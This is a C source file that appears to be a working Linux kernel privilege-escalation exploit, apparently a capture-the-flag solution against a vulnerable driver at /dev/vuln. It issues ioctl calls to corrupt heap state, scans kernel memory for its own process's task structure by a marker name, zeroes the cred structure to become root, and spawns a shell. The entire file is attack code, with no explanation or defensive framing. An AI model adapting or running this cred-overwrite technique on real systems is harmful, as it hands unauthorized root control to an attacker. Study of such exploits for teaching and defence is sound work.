#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/prctl.h>
//0x10000001
struct New{
	size_t size;
	char *buf;
};
//0x10000002
struct View{
	unsigned int idx;
	size_t size;
	char *buf;
};
//0x100000003
struct Free{
	unsigned int idx;
};
//0x100000004
struct Edit{
	unsigned int idx;
	size_t size;
	char *buf;
};
int main()
{
    size_t flag,result;
    int fd = open("/dev/vuln",O_RDWR);
    char Process_Name[] = "AZEZ_FIND";
    prctl(PR_SET_NAME , Process_Name);
    
    struct New  n;
    struct View v;
    struct Free f;
    struct Edit e;
    char *res = malloc(0x1000);
    char buf[0x100] = {0};
    memcpy(buf,"FMYY",4);
    n.buf = buf;
    n.size = 0x10;
    ioctl(fd,0x10000001,&n);
    flag = (0x1000 <<1) + 1;
    for(size_t start = 0xFFFF880000000000;start<0xFFFFC80000000000;start+=0x1000)
    {
    	memcpy(buf +0x40,&flag,8);
    	memcpy(buf +0x48,&start,8);
    	n.buf = buf;
    	n.size = 0x50;
    	ioctl(fd,0x10000001,&n);
    	f.idx = 1;
    	ioctl(fd,0x10000003,&f);
    	
    	v.idx = 0;
    	v.size = 0x1000;
    	v.buf = res;
    	ioctl(fd,0x10000002,&v);
    	result = memmem(res,0x1000,Process_Name,9);
    	if(result)
    	{
    		size_t cred = *(size_t*)(result-0x10);
    		size_t real_cred = *(size_t*)(result-0x8);
    		puts("[+] Have Found");
    		memcpy(buf+0x48,&cred,8);
    		n.size = 0x50;
    		n.buf = buf;
    		ioctl(fd,0x10000001,&n);
    		e.idx = 0;
    		e.size = 0x28;
    		char payload[0x28];
    		memset(payload,0,0x28);
			e.buf = payload;
			ioctl(fd,0x10000004,&e);
			puts("[+] ROOT-ME");
			system("/bin/sh");
    	}
    }
    close(fd);
    return 0;
}
